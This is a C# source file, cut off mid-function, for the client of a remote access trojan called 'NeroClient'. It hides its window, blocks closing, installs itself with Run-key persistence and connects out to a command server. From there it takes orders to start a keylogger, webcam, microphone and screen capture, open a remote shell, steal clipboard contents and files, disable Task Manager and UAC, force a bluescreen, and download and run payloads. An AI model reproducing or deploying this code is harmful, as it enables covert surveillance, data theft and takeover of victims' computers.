using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Speech.Synthesis;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using NeroClient.Helpers;
using NeroClient.Helpers.Information;
using NeroClient.Helpers.Networking;
using NeroClient.Helpers.Services;
using NeroClient.Helpers.Services.InputSimulator;
using NeroClient.Helpers.Telepathy;
using Message = NeroClient.Helpers.Telepathy.Message;

namespace NeroClient.Forms
{
    public partial class InitialForm : Form
    {
        #region Connect Loop

        //Connect to server, then loop data receiving
        private async void ConnectLoop()
        {
            try
            {
                // Check if DNS is a URL.
                string IPAddress = ClientSettings.DNS;
                int PORT = Port;
                if (IPAddress.Contains("//"))
                {
                    using (WebClient wc = new WebClient())
                    {

                        string response = wc.DownloadString(IPAddress);
                        IPAddress = response.Split(':')[0];
                        PORT = Convert.ToInt32(response.Split(':')[1]);

                    }
                }


                while (!Networking.MainClient.Connected)
                {
                    await Task.Delay(50);
                    Networking.MainClient.Connect(IPAddress, PORT);
                }

                while (Networking.MainClient.Connected)
                {
                    await Task.Delay(Interval);
                    GetData();
                }

            }
            catch { Thread.Sleep(5000); } // Attempt to connect again after 5 seconds

            ConnectLoop();
        }

        #endregion Connect Loop

        #region DLL Imports

        [DllImport("winmm.dll", EntryPoint = "mciSendStringA", ExactSpelling = true, CharSet = CharSet.Ansi,
            SetLastError = true)]
        private static extern int Record(string lpstrCommand, string lpstrReturnString, int uReturnLength,
            int hwndCallback);

        [DllImport("ntdll.dll")]
        public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege,
            out bool PreviousValue);

        [DllImport("ntdll.dll")]
        public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask,
            IntPtr Parameters, uint ValidResponseOption, out uint Response);

        [DllImport("Winmm.dll", SetLastError = true)]
        static extern int mciSendString(string lpszCommand, [MarshalAs(UnmanagedType.LPStr)] StringBuilder lpszReturnString, int cchReturn, IntPtr hwndCallback);

        #region Constants

        public const int WM_LBUTTONDOWN = 0x201;
        public const int WM_LBUTTONUP = 0x202;
        public const int WM_LBUTTONDBLCLK = 0x203;
        public const int WM_RBUTTONDOWN = 0x204;
        public const int WM_RBUTTONUP = 0x205;
        public const int WM_RBUTTONDBLCLK = 0x206;

        #endregion

        #region Structs

        internal struct INPUT
        {
            public uint Type;
            public MOUSEKEYBDHARDWAREINPUT Data;
        }

        [StructLayout(LayoutKind.Explicit)]
        internal struct MOUSEKEYBDHARDWAREINPUT
        {
            [FieldOffset(0)] public MOUSEINPUT Mouse;
        }

        internal struct MOUSEINPUT
        {
            public int X;
            public int Y;
            public uint MouseData;
            public uint Flags;
            public uint Time;
            public IntPtr ExtraInfo;
        }

        #endregion

        #endregion DLL Imports

        #region Declaration

        private readonly int Interval;
        private readonly int Port;
        private readonly bool Install;
        private readonly bool Startup;
        private bool ReceivingFile;
        private bool UpdateMode;
        private bool PlaySoundMode;
        private bool APActive;
        private bool ARActive;
        private bool SLActive;
        private bool TMActive;
        private bool UAActive;
        private bool CUActive;
        private string CurrentDirectory;
        private string FileToWrite;
        private string UpdateFileName;
        private string SoundFileExtension;
        private readonly string InstallPath;
        private readonly string AudioPath;
        private readonly Chat C = new Chat();
        private readonly ScreenLock SL = new ScreenLock();

        #endregion Declaration

        #region Uninstall/Install

        //Uninstall client
        private void UninstallClient()
        {
            if (Install && Startup)
            {
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
            }
        }

        //Install client
        private void InstallClient()
        {
            if (Application.ExecutablePath == InstallPath)
            {
                if (!Startup) return;
                RegistryKey RK =
                    Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                RK.DeleteValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), false);
                RK.SetValue(Path.GetFileNameWithoutExtension(Application.ExecutablePath), InstallPath);
                return;
            }

            File.Copy(Application.ExecutablePath, InstallPath, true);
            Process.Start(InstallPath);
            Process.GetCurrentProcess().Kill();
        }

        //Checks if .NET version is high enough
        private bool NetUpdated()
        {
            string Key = @"SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full\";
            RegistryKey NDP = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey(Key);
            int ReleaseNum = (int) NDP.GetValue("Release");
            return ReleaseNum >= 378389;
        }

        #endregion Uninstall/Install

        #region Form

        //Entry
        public InitialForm()
        {
            InitializeComponent();
            if (!NetUpdated())
                Process.Start("dotnetfx.exe");
            Interval = Convert.ToInt16(ClientSettings.UpdateInterval);
            Port = Convert.ToInt16(ClientSettings.Port);
            if (string.Equals(ClientSettings.Install, "true", StringComparison.OrdinalIgnoreCase)) Install = true;
            if (string.Equals(ClientSettings.Startup, "true", StringComparison.OrdinalIgnoreCase)) Startup = true;
            InstallPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\" + AppDomain.CurrentDomain.FriendlyName;
            AudioPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments) + @"\micaudio.wav";
            if (!Install && Application.ExecutablePath == InstallPath)
            {
                DialogResult dlgresult = MessageBox.Show("This is a reverse shell tool, which gives access to this machine remotely from anywhere!\nAre you sure you want to install this program?", "Are you sure?", MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);
                if (dlgresult == DialogResult.No)
                {
                    Environment.Exit(0);
                    Application.Exit();
                }
            }
            InstallClient();
        }

        //Prevent any closing of the form
        private void OnClosing(object sender, FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
                e.Cancel = true;
        }

        //Hide form on form load
        private void OnLoad(object sender, EventArgs e)
        {
            BeginInvoke(new MethodInvoker(delegate { Hide(); }));
        }

        //Once form is loaded, begin connect logic
        private void OnShow(object sender, EventArgs e)
        {
            ConnectLoop();
        }

        #endregion Form

        #region GetData

        //Get data that has been sent to the server
        private void GetData()
        {
            Message Data;
            while (Networking.MainClient.GetNextMessage(out Data))
                switch (Data.eventType)
                {
                    case EventType.Connected:
                        Console.WriteLine("Connected");
                        List<byte> ToSend = new List<byte>();
                        ToSend.Add((int) DataType.ClientTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ClientSettings.ClientTag));
                        Networking.MainClient.Send(ToSend.ToArray());
                        ToSend.Clear();
                        ToSend.Add((int) DataType.AntiVirusTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(ComputerInfo.GetAntivirus()));
                        Networking.MainClient.Send(ToSend.ToArray());
                        string OperatingSystemUnDetailed = ComputerInfo.GetWindowsVersion()
                            .Remove(ComputerInfo.GetWindowsVersion().IndexOf('('));
                        ToSend.Clear();
                        ToSend.Add((int) DataType.WindowsVersionTag);
                        ToSend.AddRange(Encoding.ASCII.GetBytes(OperatingSystemUnDetailed));
                        Networking.MainClient.Send(ToSend.ToArray());
                        break;

                    case EventType.Disconnected:
                        break;

                    case EventType.Data:
                        HandleData(Data.data);
                        break;
                }
        }

        //Handle data sent to client
        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        private void HandleData(byte[] RawData)
        {
            if (ReceivingFile)
            {
                try
                {
                    if (UpdateMode)
                    {
                        try
                        {
                            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\";
                            File.WriteAllBytes(path+ UpdateFileName, RawData);
                            Process.Start(path + UpdateFileName);
                            KillClient();
                        }
                        catch { }

                        return;
                    }
                    else if (PlaySoundMode)
                    {
                        try
                        {
                            PlaySoundMode = false;
                            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft\Windows\Templates\template." + SoundFileExtension;
                            File.WriteAllBytes(path, RawData);
                            while (!File.Exists(path)) { }
                            PlaySound(path, SoundFileExtension);
                        }
                        catch { }

                        return;
                    }


                    string Directory = CurrentDirectory;
                    if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                    File.WriteAllBytes(FileToWrite, RawData);
                    string Files = string.Empty;
                    DirectoryInfo DI = new DirectoryInfo(Directory);
                    foreach (var F in DI.GetDirectories())
                        Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                    foreach (FileInfo F in DI.GetFiles())
                        Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                                 F.CreationTime + "]";
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.FilesListType);
                    ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                    Networking.MainClient.Send(ToSend.ToArray());
                    ToSend.Clear();
                    ToSend.Add((int) DataType.NotificationType);
                    ToSend.AddRange(
                        Encoding.ASCII.GetBytes("The file " + Path.GetFileName(FileToWrite) + " was uploaded."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
                catch { }

                ReceivingFile = false;
                return;
            }

            string StringForm = string.Empty;
            try
            {
                StringForm = Encoding.ASCII.GetString(RawData);
            }
            catch { }

            #region Non-Parameterized Commands

            switch (StringForm)
            {
                case "KillClient":
                    KillClient();
                    break;

                case "DisconnectClient":
                    DisconnectClient();
                    break;

                case "GetProcesses":
                    GetProcesses();
                    break;

                case "GetComputerInfo":
                    GetComputerInfo();
                    break;

                case "RaisePerms":
                    RaisePerms();
                    break;

                case "GoUpDir":
                    GoUpDir();
                    break;

                case "GetStoredPasswords":
                    GetPasswords();
                    break;

                case "GetClipboard":
                    GetClipboard();
                    break;

                case "ToggleAntiProcess":
                    ToggleAntiProcess();
                    break;

                case "ToggleTaskManager":
                    ToggleTaskManager();
                    break;

                case "ToggleUAC":
                    ToggleUAC();
                    break;

                case "ToggleUACRestart":
                    ToggleUAC(true);
                    break;

                case "Bluescreen":
                    BSOD();
                    break;

                case "HideCursor":
                    HideCursor();
                    break;

                case "OpenChat":
                    OpenChat();
                    break;

                case "CloseChat":
                    CloseChat();
                    break;

                case "StartRD":
                    StartRD();
                    break;

                case "StopRD":
                    StopRD();
                    break;

                case "StartWC":
                    StartWC();
                    break;

                case "StopWC":
                    StopWC();
                    break;

                case "StartAR":
                    StartAR();
                    break;

                case "StopAR":
                    StopAR();
                    break;

                case "StartKL":
                    StartKL();
                    break;

                case "StopKL":
                    StopKL();
                    break;

                case "StartRS":
                    StartRS();
                    break;

                case "StopRS":
                    StopRS();
                    break;

                case "StartUsageStream":
                    StartUsageStream();
                    break;

                case "StopUsageStream":
                    StopUsageStream();
                    break;
            }

            #endregion Non-Parameterized Commands

            #region Parameterized Commands

            if (StringForm.Contains("MsgBox"))
                MsgBox(StringForm);
            else if (StringForm.Contains("EndProcess"))
                EndProcess(StringForm);
            else if (StringForm.Contains("OpenWebsite"))
                OpenWebsite(StringForm);
            else if (StringForm.Contains("GetDF"))
                GetDF(StringForm);
            else if (StringForm.Contains("GetFile"))
                GetFile(StringForm);
            else if (StringForm.Contains("StartFileReceive"))
                StartFileReceive(StringForm);
            else if (StringForm.Contains("TryOpen"))
                TryOpen(StringForm);
            else if (StringForm.Contains("DeleteFile"))
                DeleteFile(StringForm);
            else if (StringForm.Contains("ToggleScreenlock"))
                ToggleScreenlock(StringForm);
            else if (StringForm.Contains("[<MESSAGE>]"))
                Message(StringForm.Replace("[<MESSAGE>]", ""));
            else if (StringForm.Contains("[<TTS>]"))
                TTS(StringForm.Replace("[<TTS>]", ""));
            else if (StringForm.Contains("[<COMMAND>]"))
                Command(StringForm.Replace("[<COMMAND>]", ""));
            else if (StringForm.Contains("[<MOUSE>]"))
                MouseClick(StringForm);

            #endregion Parameterized Commands
        }

        #endregion GetData

        #region Functions

        //Uninstalls, then kills client
        private void KillClient()
        {
            KeyloggerStream.Stop();
            UninstallClient();
            try
            {
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            }
        }

        //Disconnects client
        private void DisconnectClient()
        {
            Networking.MainClient.Disconnect();
        }

        //Toggles screenlocker
        private void ToggleScreenlock(string StringForm)
        {
            if (!SLActive)
            {
                SLActive = true;
                Cursor.Hide();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Started screen locker."));
                Networking.MainClient.Send(ToSend.ToArray());
                if (!SL.Visible)
                {
                    SL.SetLockedText(StringForm.Substring(16));
                    SL.Show();
                }
            }
            else
            {
                SLActive = false;
                Cursor.Show();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped screen locker."));
                Networking.MainClient.Send(ToSend.ToArray());
                if (SL.Visible)
                    SL.Hide();
            }
        }

        //Toggles task manager
        private void ToggleTaskManager()
        {
            if (!TMActive)
            {
                TMActive = true;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Disabled task manager."));
                Networking.MainClient.Send(ToSend.ToArray());

                Process[] processes = Process.GetProcessesByName("taskmgr");
                foreach (var pro in processes)
                    try { pro.Kill(); } catch { }

                RegistryKey mgr = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (mgr == null)
                {
                    mgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                }
                mgr.SetValue("DisableTaskMgr", 1);
                mgr.Close();

            }
            else
            {
                TMActive = false;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Enabled task manager."));
                Networking.MainClient.Send(ToSend.ToArray());

                RegistryKey mgr = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (mgr == null)
                {
                    mgr = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                }
                mgr.SetValue("DisableTaskMgr", 0);
                mgr.Close();
            }
        }

        //Toggles UAC
        public void ToggleUAC(bool Restart = false)
        {
            if (!UAActive)
            {
                UAActive = true;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Disabled UAC."));
                Networking.MainClient.Send(ToSend.ToArray());

                Process[] processes = Process.GetProcessesByName("taskmgr");
                foreach (var pro in processes)
                    try { pro.Kill(); } catch { }

                RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (uac == null)
                {
                    uac = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                }
                uac.SetValue("EnableLUA", 0);
                uac.Close();

                if (Restart)
                    Process.Start("ShutDown", "/r");
            }
            else
            {
                UAActive = false;
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Enabled UAC."));
                Networking.MainClient.Send(ToSend.ToArray());

                RegistryKey uac = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System", true);
                if (uac == null)
                {
                    uac = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                }
                uac.SetValue("EnableLUA", 2);
                uac.Close();
            }
        }

        //Hides cursor
        private void HideCursor()
        {
            if (!CUActive)
            {
                CUActive = true;
                List<byte> ToSend = new List<byte>();
                Cursor.Hide();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Cursor is now hidden."));
                Networking.MainClient.Send(ToSend.ToArray());

            }
            else
            {
                CUActive = false;
                List<byte> ToSend = new List<byte>();
                Cursor.Show();
                ToSend.Add((int)DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Cursor is now visible."));
                Networking.MainClient.Send(ToSend.ToArray());

            }
        }

        //Play Sound
        private void PlaySound(string path, string extension)
        {
            StringBuilder sb = new StringBuilder();
            mciSendString("play \"" + path + "\" alias " + extension, sb, 0, IntPtr.Zero);

            List<byte> ToSend = new List<byte>();
            ToSend.Add((int)DataType.NotificationType);
            ToSend.AddRange(Encoding.ASCII.GetBytes("Now playing sound..."));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Gets running applications
        private void GetProcesses()
        {
            Process[] PL = Process.GetProcesses();
            List<string> ProcessList = new List<string>();
            foreach (Process P in PL)
                ProcessList.Add("{" + P.ProcessName + "}<" + P.Id + ">[" + P.MainWindowTitle + "]");
            string[] StringArray = ProcessList.ToArray<string>();
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int) DataType.ProcessType);
            string ListString = "";
            foreach (string Process in StringArray) ListString += "][" + Process;
            ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Prompts user to raise client to administrator
        private void RaisePerms()
        {
            Process P = new Process();
            P.StartInfo.FileName = Application.ExecutablePath;
            P.StartInfo.UseShellExecute = true;
            P.StartInfo.Verb = "runas";
            P.Start();
            try
            {
                Process.GetCurrentProcess().Kill();
            }
            catch
            {
                Environment.Exit(0);
            } //We don't want to uninstall client, so we just kill.
        }

        //Handle mouse click
        private void MouseClick(string MouseArgs)
        {
            int X = Convert.ToInt16(GetSubstringByString("[<X>]", @"[<\X>]", MouseArgs));
            int Y = Convert.ToInt16(GetSubstringByString("[<Y>]", @"[<\Y>]", MouseArgs));
            Point Location = new Point(X, Y);
            InputSimulator IS = new InputSimulator();
            if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "DOUBLE")
            {
                Cursor.Position = Location;               
                IS.Mouse.LeftButtonDoubleClick();
            }
            else if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "SINGLE-LEFT")
            {
                Cursor.Position = Location;
                IS.Mouse.LeftButtonClick();
            }
            else if (GetSubstringByString("[<MOUSE>]", @"[<\MOUSE>]", MouseArgs) == "SINGLE-RIGHT")
            {
                Cursor.Position = Location;
                IS.Mouse.RightButtonClick();
            }
        }

        //Shows a message box
        private void MsgBox(string Data)
        {
            string MessageBoxData = GetSubstringByString("<{", "}>", Data);
            string Text = GetSubstringByString("<", ">", MessageBoxData);
            string Header = GetSubstringByString("[", "]", MessageBoxData);
            string ButtonString = GetSubstringByString("{", "}", MessageBoxData);
            string IconString = GetSubstringByString("/", @"\", MessageBoxData);

            #region Button & Icon conditional statements

            MessageBoxButtons MBB = MessageBoxButtons.OK;
            MessageBoxIcon MBI = MessageBoxIcon.None;

            if (ButtonString.Equals("Abort Retry Ignore"))
                MBB = MessageBoxButtons.AbortRetryIgnore;
            else if (ButtonString.Equals("OK"))
                MBB = MessageBoxButtons.OK;
            else if (ButtonString.Equals("OK Cancel"))
                MBB = MessageBoxButtons.OKCancel;
            else if (ButtonString.Equals("Retry Cancel"))
                MBB = MessageBoxButtons.RetryCancel;
            else if (ButtonString.Equals("Yes No"))
                MBB = MessageBoxButtons.YesNo;
            else if (ButtonString.Equals("Yes No Cancel")) MBB = MessageBoxButtons.YesNoCancel;

            if (IconString.Equals("Asterisk"))
                MBI = MessageBoxIcon.Asterisk;
            else if (IconString.Equals("Error"))
                MBI = MessageBoxIcon.Error;
            else if (IconString.Equals("Exclamation"))
                MBI = MessageBoxIcon.Exclamation;
            else if (IconString.Equals("Hand"))
                MBI = MessageBoxIcon.Hand;
            else if (IconString.Equals("Information"))
                MBI = MessageBoxIcon.Information;
            else if (IconString.Equals("None"))
                MBI = MessageBoxIcon.None;
            else if (IconString.Equals("Question"))
                MBI = MessageBoxIcon.Question;
            else if (IconString.Equals("Stop"))
                MBI = MessageBoxIcon.Stop;
            else if (IconString.Equals("Warning")) MBI = MessageBoxIcon.Warning;

            #endregion Button & Icon conditional statements

            MessageBox.Show(Text, Header, MBB, MBI);
        }

        //Plays text to speech
        private void TTS(string Message)
        {
            try
            {
                using (SpeechSynthesizer Synth = new SpeechSynthesizer())
                {
                    Synth.SetOutputToDefaultAudioDevice();
                    Synth.Speak(Message);
                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.NotificationType);
                    ToSend.AddRange(Encoding.ASCII.GetBytes("The message " + Message + " was played."));
                    Networking.MainClient.Send(ToSend.ToArray());
                }
            }
            catch { }
        }

        //Ends a specified process
        private void EndProcess(string Data)
        {
            string ToEnd = GetSubstringByString("<{", "}>", Data);
            try
            {
                Process P = Process.GetProcessById(Convert.ToInt16(ToEnd));
                P.Kill();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("The process " + P.ProcessName + " was killed."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Opens a website
        private void OpenWebsite(string Data)
        {
            string ToOpen = GetSubstringByString("<{", "}>", Data);
            try
            {
                Process.Start(ToOpen);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("The website " + ToOpen + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Gets directory files
        private void GetDF(string Data)
        {
            try
            {
                string Directory = GetSubstringByString("{", "}", Data);
                if (Directory.Equals("BaseDirectory")) Directory = Path.GetPathRoot(Environment.SystemDirectory);
                string Files = string.Empty;
                DirectoryInfo DI = new DirectoryInfo(Directory);
                foreach (var F in DI.GetDirectories())
                    Files += "][{" + F.FullName + "}<" + "Directory" + ">[" + F.CreationTime + "]";
                foreach (FileInfo F in DI.GetFiles())
                    Files += "][{" + Path.GetFileNameWithoutExtension(F.FullName) + "}<" + F.Extension + ">[" +
                             F.CreationTime + "]";
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.FilesListType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(Files));
                Networking.MainClient.Send(ToSend.ToArray());
                CurrentDirectory = Directory;
                ToSend.Clear();
                ToSend.Add((int) DataType.CurrentDirectoryType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Gets specified file
        private void GetFile(string Data)
        {
            try
            {
                string FileString = GetSubstringByString("{[", "]}", Data);
                byte[] FileBytes;
                using (FileStream FS = new FileStream(FileString, FileMode.Open))
                {
                    FileBytes = new byte[FS.Length];
                    FS.Read(FileBytes, 0, FileBytes.Length);
                }

                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.FileType);
                ToSend.AddRange(FileBytes);
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch (Exception EX)
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Error Downloading: " + EX.Message + ")"));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Starts file uploading process
        private void StartFileReceive(string Data)
        {
            try
            {
                Random R = new Random();
                FileToWrite = GetSubstringByString("{", "}", Data);
                if (FileToWrite.Contains("[UPDATE]"))
                {
                    UpdateMode = true;
                    UpdateFileName = FileToWrite.Replace("[UPDATE]", "");
                    if (UpdateFileName == AppDomain.CurrentDomain.FriendlyName)
                        UpdateFileName = "Updated" + R.Next(0, 1000);
                }
                else if (FileToWrite.Contains("[SOUND]"))
                {
                    UpdateFileName = FileToWrite.Replace("[SOUND]", "");
                    SoundFileExtension = FileToWrite.Split('.')[FileToWrite.Count(f => f == '.')].ToUpper();
                    PlaySoundMode = true;
                }

                ReceivingFile = true;
            }
            catch { }
        }

        //Tries to open a file
        private void TryOpen(string Data)
        {
            string ToOpen = GetSubstringByString("{", "}", Data);
            try
            {
                Process.Start(ToOpen);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToOpen) + " was opened."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Deletes specified file
        private void DeleteFile(string Data)
        {
            try
            {
                string ToDelete = GetSubstringByString("{", "}", Data);
                File.Delete(ToDelete);
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(
                    Encoding.ASCII.GetBytes("The file " + Path.GetFileName(ToDelete) + " was deleted."));
                Networking.MainClient.Send(ToSend.ToArray());
                GetDF(CurrentDirectory);
            }
            catch { }
        }

        //Updates chat box (if open) with a new message
        private void Message(string Message)
        {
            if (C.Visible)
            {
                if (!string.IsNullOrWhiteSpace(C.txtChat.Text))
                    C.txtChat.AppendText(Environment.NewLine + "Admin: " + Message);
                else
                    C.txtChat.Text = "Admin: " + Message;
            }
        }

        //Writes command to shell 
        private void Command(string Command)
        {
            RemoteShellStream.WriteLine = true;
            RemoteShellStream.Input = Command;
        }

        //Gets computer information
        private void GetComputerInfo()
        {
            string ListString = "";
            List<string> ComputerInfoList = new List<string>();
            try
            {
                ComputerInfo.GetGeoInfo();
            }
            catch { }

            ComputerInfoList.Add("Computer Name: " + ComputerInfo.GetName());
            ComputerInfoList.Add("Computer CPU: " + ComputerInfo.GetCPU());
            ComputerInfoList.Add("Computer GPU: " + ComputerInfo.GetGPU());
            ComputerInfoList.Add("Computer Ram Amount (MB): " + ComputerInfo.GetRamAmount());
            ComputerInfoList.Add("Computer Antivirus: " + ComputerInfo.GetAntivirus());
            ComputerInfoList.Add("Computer OS: " + ComputerInfo.GetWindowsVersion());
            ComputerInfoList.Add("Country: " + ComputerInfo.GeoInfo.Country);
            ComputerInfoList.Add("Region Name: " + ComputerInfo.GeoInfo.RegionName);
            ComputerInfoList.Add("City: " + ComputerInfo.GeoInfo.City);
            foreach (string Info in ComputerInfoList.ToArray()) ListString += "," + Info;
            List<byte> ToSend = new List<byte>();
            ToSend.Add((int) DataType.InformationType);
            ToSend.AddRange(Encoding.ASCII.GetBytes(ListString));
            Networking.MainClient.Send(ToSend.ToArray());
        }

        //Gets stored passwords
        private void GetPasswords() { }

        //Goes up directory
        private void GoUpDir()
        {
            try
            {
                List<byte> ToSend = new List<byte>();
                ToSend.Add(7); //Directory Up Type
                CurrentDirectory = Directory.GetParent(CurrentDirectory).ToString();
                ToSend.AddRange(Encoding.ASCII.GetBytes(CurrentDirectory));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Gets copied text
        private void GetClipboard()
        {
            try
            {
                string ClipboardText = "Clipboard is empty or contains an invalid data type.";
                Thread STAThread = new Thread(
                    () =>
                    {
                        if (Clipboard.ContainsText(TextDataFormat.Text))
                            ClipboardText = Clipboard.GetText(TextDataFormat.Text);
                    });
                STAThread.SetApartmentState(ApartmentState.STA);
                STAThread.Start();
                STAThread.Join();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.ClipboardType);
                ToSend.AddRange(Encoding.ASCII.GetBytes(ClipboardText));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            catch { }
        }

        //Starts or stops anti-process (task manager, etc.)
        private void ToggleAntiProcess()
        {
            if (!APActive)
            {
                APActive = true;
                AntiProcess.StartBlock();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Started Anti-Process."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
            else if (APActive)
            {
                APActive = false;
                AntiProcess.StopBlock();
                List<byte> ToSend = new List<byte>();
                ToSend.Add((int) DataType.NotificationType);
                ToSend.AddRange(Encoding.ASCII.GetBytes("Stopped Anti-Process."));
                Networking.MainClient.Send(ToSend.ToArray());
            }
        }

        //Starts remote shell
        private void StartRS()
        {
            RemoteShellStream.Start();
        }

        //Stops remote shell
        private void StopRS()
        {
            RemoteShellStream.Stop();
        }

        //Starts hardware usage stream
        private void StartUsageStream()
        {
            HardwareUsageStream.Start();
        }

        //Stops hardware usage stream
        private void StopUsageStream()
        {
            HardwareUsageStream.Stop();
        }

        //Starts remote desktop
        private void StartRD()
        {
            RemoteDesktopStream.Start();
        }

        //Stops remote desktop
        private void StopRD()
        {
            RemoteDesktopStream.Stop();
        }

        //Starts keylogger
        private void StartKL()
        {
            KeyloggerStream.Start();
        }

        //Stops keylogger
        private void StopKL()
        {
            KeyloggerStream.Stop();
        }

        //Starts webcam
        private void StartWC()
        {
            WebCameraStream.Start();
        }

        //Stops webcam
        private void StopWC()
        {
            WebCameraStream.Stop();
        }

        //Opens chat
        private void OpenChat()
        {
            if (!C.Visible)
                C.Show();
        }

        //Closes chat
        private void CloseChat()
        {
            if (C.Visible)
                C.Hide();
        }


        //Starts audio recorder
        private void StartAR()
        {
            try
            {
                if (!ARActive)
                {
                    Record("open new Type waveaudio Alias recsound", "", 0, 0);
                    Record("record recsound", "", 0, 0);
                    if (File.Exists(AudioPath))
                        File.Delete(AudioPath);
                    ARActive = true;
                }
            }
            catch { }
        }

        //Stops audio recorder
        private void StopAR()
        {
            try
            {
                if (ARActive)
                {
                    Record("save recsound " + AudioPath, "", 0, 0);
                    Record("close recsound", "", 0, 0);
                    Thread.Sleep(100);
                    byte[] FileBytes;
                    using (FileStream FS = new FileStream(AudioPath, FileMode.Open))
                    {
                        FileBytes = new byte[FS.Length];
                        FS.Read(FileBytes, 0, FileBytes.Length);
                    }

                    List<byte> ToSend = new List<byte>();
                    ToSend.Add((int) DataType.MicrophoneRecordingType);
